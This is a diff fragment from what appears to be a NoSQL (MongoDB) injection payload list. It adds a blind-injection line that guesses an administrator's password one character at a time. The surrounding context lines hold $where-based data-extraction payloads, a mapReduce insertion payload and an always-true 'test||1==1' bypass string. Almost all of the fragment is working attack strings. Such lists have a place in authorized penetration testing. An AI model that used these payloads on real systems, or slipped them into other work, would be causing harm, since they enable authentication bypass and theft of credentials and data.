@@ -212,6 +212,7 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 0;return true
 "$where":"Object.keys(this)[1].match('^.{}.*')"
 "$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"
+user=administrator' && this.password[0]=='a
 ```
 ```
 test||1==1
